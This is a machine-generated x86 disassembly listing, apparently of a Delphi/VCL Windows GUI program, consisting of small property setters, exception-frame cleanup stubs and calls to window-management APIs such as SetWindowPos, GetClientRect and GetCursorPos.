cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_48e088
movzx eax [ eax + 0x8a ]
xor al 0x1
retn
sub_48e094
movzx eax [ eax + 0x60 ]
xor al 0x1
retn
sub_48e09c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_48f2b0
sub_48e0c0
cmp dl [ eax + 0x89 ]
je r-xdata
retn
mov [ eax + 0x89 ] dl
mov [ eax + 0x8a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_48f2b0
sub_48e0e4
cmp dl [ eax + 0x8a ]
je r-xdata
retn
mov [ eax + 0x8a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_48f2b0
sub_48e110
cmp dl [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] dl
sub_48e16c
movzx eax [ eax + 0x5a ]
xor al 0x1
retn
sub_48e174
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_48f2b0
sub_48e198
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_48f2b0
sub_48e1bc
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_48f2b0
sub_48e1d8
push ebx
mov ebx eax
call sub_48ac30
cmp ebx eax
sete al
pop ebx
retn
sub_48e210
push esi
mov esi eax
mov dl 0x1
mov eax esi
mov si 0xffcf
call sub_4483f8
pop esi
retn
sub_48e39e
jmp sub_448b58
sub_48e3a5
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48e4cc
test [ eax + 0x50 ] 0x40
setne cl
movzx edx [ eax + 0x57 ]
call sub_48e438
retn
sub_48e590
push esi
push edi
mov esi eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8c ]
sub_48e5a8
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_48e68d
jmp sub_448b58
sub_48e6b0
xor eax eax
retn
sub_48e6b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_48e6cc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_48e6e4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_48e700
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
movzx edx [ edx + 0x4 ]
call sub_48e71c
retn
sub_48e7fc
retn
sub_48e800
cmp eax [ rw-data ]
sete al
retn
sub_48e874
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_48e994
push ebp
mov ebp esp
push esi
mov esi edx
mov edx esi
mov si 0xffd2
call sub_4483f8
pop esi
pop ebp
retn 0x4
sub_48ecc3
jmp sub_448b58
sub_48ecca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ecd4
push esi
xor ecx ecx
mov si 0xffe9
call sub_4483f8
pop esi
retn
sub_48ece4
push esi
mov cl 0x1
mov si 0xffe9
call sub_4483f8
pop esi
retn
sub_48efba
jmp sub_448b58
sub_48f070
push esi
mov si 0xffee
call sub_4483f8
pop esi
retn
sub_48f07c
mov al 0x1
retn
sub_48f2e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_48f2b0
pop ebx
pop ebp
retn 0x4
sub_48f2f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_48f2b0
pop ebx
pop ebp
retn 0x4
sub_48f3d8
retn
sub_48f74d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_428ad8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_48f768
movzx eax [ eax + 0x5e ]
xchg edx eax
call sub_42b32c
retn
sub_48fc20
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_490254
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_490260
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_49026c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_490380
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
sub_490408
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x7c ]
mov eax ebx
call sub_48e064
mov [ ebx + 0x56 ] 0x1
sub_490428
mov [ edx + 0xc ] 0x1
retn
sub_4904f8
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_49075c
jmp sub_448b58
sub_490763
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_490790
mov eax [ r-xdata ]
retn
sub_49092d
jmp sub_448b58
sub_490934
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_490a54
mov eax [ eax + 0xa8 ]
retn
sub_490abc
push ebx
mov ebx eax
mov eax ebx
call sub_48e6b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_490ad8
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_490c8c
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_490d98
jmp sub_448b58
sub_490d9f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_490dcc
mov edx [ eax ]
call [ edx + 0x58 ]
retn
sub_490dd4
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_490e4c
mov eax [ eax + 0x190 ]
xchg edx eax
call sub_42bb80
retn
sub_490e5c
mov eax [ eax + 0x198 ]
xchg edx eax
call sub_42bb80
retn
sub_490e6c
mov eax [ eax + 0x18c ]
xchg edx eax
call sub_42bb80
retn
sub_490e7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x194 ] eax
pop esi
pop ebx
retn
sub_490e94
mov eax [ eax + 0x194 ]
xchg edx eax
call sub_42bb80
retn
sub_490ea4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x190 ] eax
pop esi
pop ebx
retn
sub_490ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x198 ] eax
pop esi
pop ebx
retn
sub_490ed4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x18c ] eax
pop esi
pop ebx
retn
sub_490f10
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_490f18
call sub_48cc98
retn
sub_491051
jmp sub_448b58
sub_491220
jmp sub_448b58
sub_491270
jmp sub_448b58
sub_491bbe
jmp sub_448b58
sub_491c52
jmp sub_448b58
sub_491c76
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x1a0
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
retn
sub_491c8f
jmp sub_448b58
j_sub_491c76
jmp sub_491c76
sub_491ce7
jmp sub_448b58
sub_491cee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491d11
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
sub_491d0a
jmp sub_448b58
sub_491d11
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_491f29
jmp sub_448b58
sub_491f98
jmp sub_448b58
sub_49202b
jmp sub_448b58
sub_492038
inc [ eax + 0x1a4 ]
retn
sub_492040
dec [ eax + 0x1a4 ]
cmp [ eax + 0x1a4 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_492060
sub_492060
xor edx edx
call sub_491fa4
retn
sub_49212d
jmp sub_448b58
sub_492134
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49222a
jmp sub_448b58
sub_492284
jmp r-xdata
test edx edx
je r-xdata
test edx edx
setne al
retn
cmp eax edx
jne r-xdata
mov edx [ edx + 0x30 ]
sub_4927c7
jmp sub_448b58
sub_4927ce
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4929b3
jmp sub_448b58
sub_4929ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_492a8c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_492ca1
jmp sub_448b58
sub_492ca8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
pop ecx
pop ebp
retn
sub_492ec4
cmp [ eax + 0x24c ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_48f2b0
sub_492f38
jmp sub_448b58
sub_493092
jmp sub_448b58
sub_4930a3
jmp sub_4488a4
sub_49314c
jmp sub_448b58
sub_493190
cmp dl [ eax + 0x1e6 ]
je r-xdata
retn
mov [ eax + 0x1e6 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb050
call sub_48f2b0
sub_493295
jmp sub_448b58
sub_4932e7
jmp sub_448b58
sub_4932ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4488a4#3
jmp sub_4488a4
sub_4932fd
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_493b9b
jmp sub_448b58
sub_493e36
jmp sub_448b58
sub_493e73
jmp sub_448b58
sub_493e7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49405d
jmp sub_448b58
sub_494224
jmp sub_448b58
sub_49422b
push 0xfffffffe
push 0xfffffffe
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
mov esp ebp
pop ebp
retn
sub_494475
jmp sub_448b58
sub_49447c
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xff7f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4945a1
jmp sub_448b58
sub_4945c8
jmp sub_448b58
sub_4946ab
jmp sub_448b58
sub_4946e4
jmp sub_448b58
sub_494738
push ebx
mov ebx eax
call sub_46c72c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_48f2b0
pop ebx
retn
sub_494754
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_48f2b0
retn
sub_494768
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_48f2b0
retn
sub_494778
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_48f2b0
retn
sub_494ab0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_496c20
mov eax esi
call sub_490e18
pop esi
retn
sub_494bd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_494cbc
xor edx edx
mov eax esi
call sub_497d60
pop esi
retn
sub_494bf0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_494e24
mov dl 0x1
mov eax esi
call sub_497d60
pop esi
retn
sub_494c0c
push esi
mov esi eax
mov [ esi + 0x255 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_494c20
push esi
mov esi eax
mov [ esi + 0x255 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_494cae
jmp sub_448b58
sub_494e16
jmp sub_448b58
sub_494e1d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_494f32
jmp sub_448b58
sub_494f39
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_494f40
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
retn
sub_494f54
retn
sub_494f58
push ebx
cmp [ eax + 0x1fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
sub_494f78
push ebx
cmp [ eax + 0x202 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
sub_4950dc
mov edx [ eax + 0x1bc ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4951ac
retn
sub_4952f8
jmp sub_448b58
sub_4952ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_495308
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
mov [ eax + 0x1e6 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb04f
call sub_48f2b0
sub_4953ef
jmp sub_448b58
sub_49541c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
retn
cmp [ eax + 0x1c0 ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x1c0 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_4954ab
jmp sub_448b58
sub_4956ec
push ebx
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_4959d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x24c ] eax
mov [ esi + 0x1e2 ] 0x0
pop esi
retn
sub_495aac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_4925c4
pop esi
retn
sub_495ba4
push esi
mov si 0xffc0
call sub_4483f8
pop esi
retn
sub_495bd0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_495be4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_495bf8
call sub_492554
retn
sub_495c00
call sub_492554
retn
sub_495c08
call sub_492554
retn
sub_495c40
movzx edx [ eax + 0x1e2 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x24c ]
push eax
call SetWindowPos
retn
sub_495cb0
push ebx
mov ebx eax
mov eax ebx
call sub_49026c
mov edx [ ebx + 0x6c ]
mov eax [ ebx + 0x1b8 ]
call sub_46df1c
mov dx 0xb009
mov eax ebx
call sub_4925c4
pop ebx
retn
sub_495e40
call sub_492554
retn
sub_495e48
call sub_492554
retn
sub_495e50
call sub_492554
retn
sub_495e58
call sub_492554
retn
sub_495ec0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_495ed4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_496406
jmp sub_448b58
sub_49640d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4964ec
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_496690
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_48f2b0
retn
sub_496734
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x24c ]
push eax
call UpdateWindow
sub_496750
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
pop esi
retn
sub_4969d0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_496868
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_496a24
cmp edx [ eax + 0x1b0 ]
je r-xdata
retn
mov [ eax + 0x1b0 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_48f2b0
sub_496a44
cmp dl [ eax + 0x1e1 ]
je r-xdata
retn
mov [ eax + 0x1e1 ] dl
mov [ eax + 0x1e5 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_48f2b0
sub_496a68
movzx eax [ eax + 0x1e5 ]
xor al 0x1
retn
sub_496a74
movzx eax [ eax + 0x1e6 ]
xor al 0x1
retn
sub_496a80
cmp dl [ eax + 0x1e5 ]
je r-xdata
retn
mov [ eax + 0x1e5 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_48f2b0
sub_496b2c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_496ad0
retn
movsx edx dx
mov [ eax + 0x1dc ] edx
retn
sub_496c08
jmp sub_448b58
sub_496c0f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_496e6e
jmp sub_448b58
sub_496e75
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_496f80
call sub_48f080
retn
sub_4974bd
jmp sub_448b58
sub_497554
mov eax [ r-xdata ]
retn
sub_4976ba
jmp sub_448b58
sub_4977c8
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_48f2b0
sub_4977e8
cmp edx [ eax + 0x1ac ]
je r-xdata
retn
mov [ eax + 0x1ac ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_48f2b0
sub_497b47
jmp sub_448b58
sub_497cdd
jmp sub_448b58
sub_497d00
test [ eax + 0x52 ] 0x4
setne al
retn
sub_497d48
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax esi
call sub_497d60
pop esi
retn
sub_497d94
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0xc
sub_497da0
xor eax eax
retn
sub_497df8
call sub_492060
retn
sub_497e00
mov eax [ eax + 0x1b4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_497f44
jmp sub_448b58
sub_497f4b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_498071
jmp sub_448b58
sub_498078
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a0 ]
call sub_46e7bc
retn
sub_498094
jmp sub_448b58
sub_4980a0
retn
sub_498170
mov [ edx + 0xc ] 0xffffffff
retn
sub_4981ce
jmp sub_448b58
sub_4981d5
pop ecx
pop ecx
pop ebp
retn
sub_4982f1
jmp sub_448b58
sub_4982f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_498364
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xb0 ]
pop esi
retn
sub_4983ff
jmp sub_448b58
sub_498406
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4986a9
jmp sub_448b58
sub_4986b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4986cd
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4986c6
jmp sub_448b58
sub_4986cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4987e8
mov al 0x1
retn
sub_49882c
push ebx
mov ebx eax
mov eax ebx
call sub_44f240
or edx 0xffffffff
mov eax ebx
call sub_498890
pop ebx
retn
sub_498890
cmp dx [ eax + 0x70 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x70 ] cx
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax ecx
xchg edx eax
call sub_47fbf8
sub_498a24
push ebx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_498a3c
push ebx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_498b34
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_494494
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_498bcf
jmp sub_448b58
sub_498bd6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_498bf9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e7bc
retn
sub_498bf2
jmp sub_448b58
sub_498bf9
pop ebx
pop ecx
pop ebp
retn
sub_498c00
retn
sub_498c80
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_49901d
jmp sub_448b58
sub_499208
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_4993f9
jmp sub_448b58
sub_4994ac
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_4994c4
inc [ eax + 0x6c ]
retn
sub_4994c8
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_49b150
sub_49962c
call sub_499d18
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_499e46
jmp sub_448b58
sub_499e4d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49a172
jmp sub_448b58
sub_49a179
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a19e
lea eax [ ebp - 0x44 ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
sub_49a197
jmp sub_448b58
sub_49a19e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49a55e
jmp sub_448b58
sub_49a565
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a582
mov eax [ ebp - 0x4 ]
call sub_46e7bc
retn
sub_49a57b
jmp sub_448b58
sub_49a582
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a59f
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_49a598
jmp sub_448b58
sub_49a59f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49aa85
jmp sub_448b58
sub_49aa8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49ac60
jmp sub_448b58
sub_49ac67
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_49ad73
jmp sub_448b58
sub_49ad7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49aecd
jmp sub_448b58
sub_49af62
jmp sub_448b58
sub_49af69
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49b028
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_499534
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_49b178
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_499060
sub_49b188
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_49b924
cmp dl 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4806e8
call sub_47f294
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4806e8
call sub_47f2c8
retn
sub_49bcf3
jmp sub_448b58
sub_49bcfa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_49bdf0
call GetCapture
retn
sub_49bdf8
push ebx
mov ebx edx
push ebx
call GetCursorPos
test eax eax
jne r-xdata
pop ebx
retn
mov ecx ebx
xor edx edx
xor eax eax
call sub_432a5c
sub_49be14
cmp [ rw-data ] 0x0
setne al
retn
sub_49be44
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_49c0d2
jmp sub_448b58
sub_49c3a0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_49c5df
jmp sub_448b58
sub_49c5e6
pop ebx
mov esp ebp
pop ebp
retn
sub_49c718
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_49c72c
mov [ edx + 0x8 ] 0x3
mov [ edx + 0x10 ] 0x3
mov [ edx + 0xc ] 0x3
mov [ edx + 0x14 ] 0x3
retn
sub_49c87f
jmp sub_448b58
sub_49ca54
retn
sub_49ca58
mov edx eax
mov eax [ eax + 0x268 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_49ca68
call sub_497d48
retn
sub_49caf4
push ebx
mov ebx edx
mov edx ebx
call sub_4926c0
mov [ ebx + 0x4 ] 0x80000000
mov [ ebx + 0x8 ] 0x88
pop ebx
retn
sub_49cb68
push ebx
push esi
mov esi eax
mov ecx edx
mov eax [ esi + 0x268 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop esi
pop ebx
retn
sub_49cb80
mov edx eax
mov eax [ eax + 0x268 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
retn
sub_49cb90
push ebx
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_49cc50
pop ecx
pop edx
pop ebx
retn
sub_49cc8c
mov [ edx + 0xc ] 0xffffffff
retn
sub_49ccea
jmp sub_448b58
sub_49ccf1
pop ecx
pop ecx
pop ebp
retn
sub_49ce44
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x38 ] ecx
test ecx ecx
je r-xdata
mov edx eax
mov eax ecx
call sub_42e354
sub_49cef8
cmp edx [ eax + 0x54 ]
jne r-xdata
retn
call sub_49cf04
sub_49cf04
mov [ eax + 0x4c ] 0x0
retn
sub_49cf0c
retn
sub_49d138
mov [ eax + 0x4c ] 0x1
retn
sub_49d23d
jmp sub_448b58
sub_49d244
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49d437
jmp sub_448b58
sub_49d520
jmp sub_448b58
sub_49d56a
jmp sub_448b58
sub_49d571
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_49d6d7
jmp sub_448b58
sub_49d799
jmp sub_448b58
sub_49d88c
jmp sub_448b58
sub_49d90d
jmp sub_448b58
sub_49d97b
jmp sub_448b58
sub_49d982
retn
sub_49d983
jmp sub_448b58
sub_49d9d8
mov eax [ eax + 0x40 ]
call sub_424ab8
retn
sub_49d9e4
mov eax [ eax + 0x50 ]
call sub_4331a8
retn
sub_49da4f
jmp sub_448b58
sub_49da56
pop ebp
retn
sub_49dad7
jmp sub_448b58
sub_49dade
pop ebp
retn
sub_49db55
jmp sub_448b58
sub_49db5c
pop ebp
retn
sub_49db60
sub [ rw-data ] 0x1
retn
sub_49ef40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
